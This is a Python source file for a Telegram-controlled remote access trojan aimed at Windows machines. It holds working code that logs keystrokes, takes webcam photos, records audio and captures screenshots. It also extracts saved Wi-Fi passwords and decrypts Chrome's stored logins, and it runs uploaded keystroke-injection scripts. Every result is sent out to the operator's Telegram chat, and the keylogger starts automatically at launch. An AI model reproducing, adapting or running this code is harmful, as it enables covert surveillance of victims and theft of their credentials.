import os
try:
    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder,time,threading
    from telebot import types
    from Crypto.Cipher import AES
    from datetime import timezone, datetime, timedelta
except:
    os.system('pip install requirements.txt')

bot_token = "ENTER_YOUR_BOT_TOKEN_HERE"
bot = telebot.TeleBot(token=bot_token,parse_mode=None)

#KEYLOGGER
keylogs_data = ''
WANT = 'no'

def autolog():
    global keylogs_data
    from pynput.keyboard import Listener
    def on_press(key):
        global keylogs_data
        keylogs_data = keylogs_data+str(key)
    with Listener(on_press=on_press) as listener:
        listener.join()

def log_sender(CHAT_ID):
    global keylogs_data,WANT
    while 1==1:
        time.sleep(15)
        if len(keylogs_data) == 0:
            pass
        else:
            if WANT=='yes':
                keylogs_data_final = keylogs_data
                keylogs_data = ''
                bot.send_message(CHAT_ID, keylogs_data_final.replace('Key.backspace','\b').replace("Key.ctrl_l'\x16'"," paste ").replace("Key.ctrl_l'\x03'"," copy ").replace("''","").replace('Key.space',' ').replace('Key.enter','\n').replace("'",""))
            else:
                pass

#CAMERA
def camera():
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        for i in range(1):
            return_value, image = camera.read()
            cv2.imwrite('cam.png', image)
        del(camera)
    except:
        pass

#RECORD
def record():
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        import wavio as wv
        recording = sd.rec(int(5*4450),samplerate=4450, channels=2)
        sd.wait()
        write("recording.mp3", 4450, recording)
    except:
        pass

#WIFI PASSWORD


def wifi_pass():
    wifipass = open('wifipass.txt','w')
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                wifipass.write("{:<30}|  {:<}".format(i, results[0]))
                wifipass.write("\n")
            except IndexError:
                wifipass.write("{:<30}|  {:<}".format(i, ""))
                wifipass.write("\n")
        except subprocess.CalledProcessError:
            pass

def wifi_pass1():
    wifipass = open('wifipass.txt','w')
    os.system('netsh wlan show profiles >> wifi_temp.txt')
    data = open('wifi_temp.txt','r').read().replace('''
Profiles on interface WiFi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
 ''',' ').replace("\n",'')
    profiles = data.split('    All User Profile     : ')
    os.remove('wifi_temp.txt')
    for i in profiles:
        os.system('netsh wlan show profiles '+i+' key=clear | findstr Key >> wifi_temp.txt')
        results = open('wifi_temp.txt','r').read().replace('''Key Content            : ''','##').replace('\n','').replace('    ','').split('##')
        wifipass.write("{:<30}|  {:<}".format(i, str(results[len(results)-1])))
        wifipass.write("\n")
    os.remove('wifi_temp.txt')



#CHROME PASSWORD
def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]

def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"

def chrome_password():
    chromepass = open('chromepass.txt','w')
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(password_db_path,"my_chrome_data.db")
    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
    encp_key = encryption_key()
    chromepass.write("\n"+"-"*50+"\n")
    for row in cursor.fetchall():
        site_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], encp_key)
        date_created = row[3]
        if username or password:
            chromepass.write("Site Login URL: "+site_url+'\n')
            chromepass.write("Username/Email: "+username+'\n')
            chromepass.write(f"Password: "+password+'\n')
        else:
            continue
        if date_created:
            chromepass.write("Date date_created: "+str(my_chrome_datetime(date_created)))
        chromepass.write("\n"+"-"*50+"\n")
    cursor.close()
    db.close()
    os.remove("my_chrome_data.db")

#SCREENSHOT
def screenshoot_click():
    try:
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('ss.png')
    except:
        pass

#                      DUCKY

def ducktopython():
    f = open("TeleRat_DUCKSCRIPT.txt","r",encoding='utf-8')
    ducktopy = ''
    ducktopy = ducktopy+"import pyautogui\n"
    ducktopy = ducktopy+"import time\n"
    duckyScript = f.readlines()
    duckyScript = [x.strip() for x in duckyScript]
    defaultDelay = 0
    if duckyScript[0][:7] == "DEFAULT":
	    defaultDelay = int(duckyScript[0][:13]) / 500
    previousStatement = ""
    duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN","LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END","ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE","TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t"," u", " v", " w", " x", " y", " z", " A", " B"," C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P"," Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]
    pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down","left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end","esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space","tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t","u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h","i","j", "k", "l", "m", "n", "o", "p","q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    for line in duckyScript:
	    if line[0:3] == "REM" :
		    previousStatement = line.replace("REM","#")
	    elif line[0:5] == "DELAY" :
		    previousStatement = "time.sleep(" + str(float(line[6:]) / 500) + ")"
	    elif line[0:6] == "STRING" :
		    previousStatement = "pyautogui.typewrite(\"" + line[7:] + "\", interval=0.02)"
	    elif line[0:6] == "REPEAT" :
		    for i in range(int(line[7:]) - 1):
			    ducktopy = ducktopy+previousStatement+"\n"
	    else:
		    previousStatement = "pyautogui.hotkey("
		    for j in range(len(pyautoguiCommands)):
			    if line.find(duckyCommands[j]) != -1:
				    previousStatement = previousStatement + "\'" +     pyautoguiCommands[j] + "\',"
		    previousStatement = previousStatement[:-1] + ")"
	    if defaultDelay != 0:
		    previousStatement = "time.sleep(" + defaultDelay + ")"
	    ducktopy = ducktopy+previousStatement+"\n"
    exec(ducktopy)

#-----------------------------------------------------------------------------------------------------------------#

#                      START

try:
  @bot.message_handler(commands=['start', 'help'])
  def handle_start_help(message):
    markup = types.ReplyKeyboardMarkup(row_width=1)
    itembtn1 = types.KeyboardButton('Cam')
    itembtn2 = types.KeyboardButton('Ducky')
    itembtn3 = types.KeyboardButton('Record')
    itembtn4 = types.KeyboardButton('wifipass')
    itembtn5 = types.KeyboardButton('Keylogger')
    itembtn6 = types.KeyboardButton('screenshot')
    itembtn7 = types.KeyboardButton('chromepass')
    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6,itembtn7)
    bot.send_message(message.from_user.id,message.text, reply_markup=markup)
except:
    pass

#                      COMMANDS

@bot.message_handler(content_types=['document'])
def send_text(message):
    try:
        file_id = bot.get_file(message.document.file_id)
        if '.txt' in str(file_id.file_path):
            duck_script_run = bot.download_file(file_id.file_path)
            with open("TeleRat_DUCKSCRIPT.txt", "w") as f:
                f.write(duck_script_run.decode('utf-8').replace('\n',''))
                f.close()
            threading.Thread(target=ducktopython).start()
            time.sleep(5)
            os.remove("TeleRat_DUCKSCRIPT.txt")
            bot.send_message(message.from_user.id, 'Script Executed')
        else:
            bot.send_message(message.from_user.id, 'Expecting a text file!!!')
    except:
        bot.send_message(message.from_user.id, 'Error!')

try:
  @bot.message_handler(func=lambda message: True)
  def message_handel(message):

    #KEYLOGGER
    threading.Thread(target=log_sender,args=[message.from_user.id]).start()
    global WANT
    try:
        if 'keylogger' in str(message.text).lower():
            if str(message.text).lower() == 'keylogger':
                bot.send_message(message.from_user.id, 'Type "keylogger start" to start')
                bot.send_message(message.from_user.id, 'Type "keylogger stop" to stop')
            if "keylogger start" in str(message.text).lower():
                WANT = 'yes'
                bot.send_message(message.from_user.id, 'Will send you the keylogs')
            elif "keylogger stop" in str(message.text).lower():
                WANT = 'no'
                bot.send_message(message.from_user.id, 'Will not send you the keylogs')
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #Ducky
    try:
      if str(message.text).lower() == 'ducky':
        bot.send_message(message.from_user.id, 'UPLOAD a .txt containing ducky script!!')
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #CAMERA
    try:
      if str(message.text).lower() == 'cam':
        bot.send_message(message.from_user.id, 'Processing command "Cam", Please wait...')
        threading.Thread(target=camera).start()
        time.sleep(5)
        photo = open('cam.png', 'rb')
        bot.send_photo(message.from_user.id, photo)
        photo.close()
        if os.path.exists("cam.png"):
            os.remove("cam.png")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #RECORDING
    try:
      if str(message.text).lower() == 'record':
          bot.send_message(message.from_user.id, 'Processing command "Record", Please wait...')
          threading.Thread(target=record).start()
          time.sleep(5)
          recording = open('recording.mp3', 'rb')
          bot.send_voice(message.from_user.id, recording)
          recording.close()
          if os.path.exists("recording.mp3"):
              os.remove("recording.mp3")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #CHROME PASSWORD
    try:
      if str(message.text).lower() == 'chromepass':
        bot.send_message(message.from_user.id, 'Processing Chrome Passwords, Please wait...')
        threading.Thread(target=chrome_password).start()
        time.sleep(5)
        chrome_pass = open('chromepass.txt', 'rb')
        bot.send_document(message.from_user.id, chrome_pass)
        chrome_pass.close()
        if os.path.exists("chromepass.txt"):
            os.remove("chromepass.txt")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #SCREENSHOT
    try:
      if str(message.text).lower() == 'screenshot':
        bot.send_message(message.from_user.id, 'Capturing Screenshot, Please wait...')
        threading.Thread(target=screenshoot_click).start()
        time.sleep(5)
        photo = open('ss.png', 'rb')
        bot.send_photo(message.from_user.id, photo)
        photo.close()
        if os.path.exists("ss.png"):
            os.remove("ss.png")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #WIFI PASSWORD
    try:
        if str(message.text).lower() == 'wifipass':
            bot.send_message(message.from_user.id, 'Capturing Wifi Passwords, Please wait...')
            try:
                threading.Thread(target=wifi_pass).start()
                time.sleep(5)
            except:
                threading.Thread(target=wifi_pass1).start()
                time.sleep(5)
            wifi_pass_open = open('wifipass.txt', 'rb')
            bot.send_document(message.from_user.id, wifi_pass_open)
            wifi_pass_open.close()
            if os.path.exists("wifipass.txt"):
                os.remove("wifipass.txt")
    except:
        bot.send_message(message.from_user.id, 'Error!')

except:
    pass

threading.Thread(target=autolog).start()
bot.polling()
